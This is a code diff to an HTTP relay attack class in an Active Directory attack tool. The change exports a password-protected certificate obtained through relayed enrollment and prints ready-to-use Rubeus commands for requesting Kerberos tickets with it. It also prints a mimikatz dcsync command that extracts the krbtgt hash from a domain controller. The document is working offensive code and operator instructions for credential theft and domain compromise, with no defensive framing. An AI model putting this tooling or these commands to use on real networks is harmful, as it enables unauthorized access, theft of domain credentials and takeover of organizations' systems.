@@ -84,12 +84,13 @@ class HTTPAttack(ProtocolAttack):
 
         certificate_store = self.generate_pfx(key, certificate)
         no_do = self.username.replace("$","")
-        
+        b64pfx = base64.b64encode(certificate_store).decode()
+        pfx_pass = config.get_pass()
         append = "\nTips:\n    If the target is DC, pls set --template=DomainController.\n    Using DC cert, you can get other users hash with dcsync.\n\n    Example: mimikatz.exe \"lsadump::dcsync /domain:cgdoamin.com /user:krbtgt\" exit"
-        usage ="""Exploit successful! \n
+        Rubeus_usage ="""Exploit successful! \n
 -------------------------------------------------------------------------------------------------------
 ReqTGT:
-    Rubeus.exe asktgt /user:{} /certificate:{} /outfile:{}.tgt /enctype:aes256 /opsec
+    Rubeus.exe asktgt /user:{} /certificate:{} /outfile:{}.tgt /password:{} /enctype:aes256 /opsec
 
 ReqTGS:
     Rubeus.exe asktgs /user:{} /ticket:{}.tgt /service:SPN1,SPN2,... /outfile:{}.tgs /enctype:aes256 /opsec
@@ -98,10 +99,12 @@ Change to ccache:
     ticketConverter.py {}.tgs test.ccache
 {}
 -------------------------------------------------------------------------------------------------------
-""".format(self.username, base64.b64encode(certificate_store).decode(), no_do, self.username, no_do, no_do, no_do, append)
+""".format(self.username, b64pfx, no_do, pfx_pass, self.username, no_do, no_do, no_do, append)
         #logging.critical("Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store).decode()))
-        logging.critical(usage)
+        logging.critical(Rubeus_usage)
+        config.set_pfx(b64pfx)
         config.set_pki(True)
+        config.set_targetName(no_do)
 
     def generate_csr(self, key, CN):
         logging.info("Generating CSR...")
@@ -117,4 +120,5 @@ Change to ccache:
         p12 = crypto.PKCS12()
         p12.set_certificate(certificate)
         p12.set_privatekey(key)
-        return p12.export()
+        pfx_pass = config.get_pass()
+        return p12.export(pfx_pass)
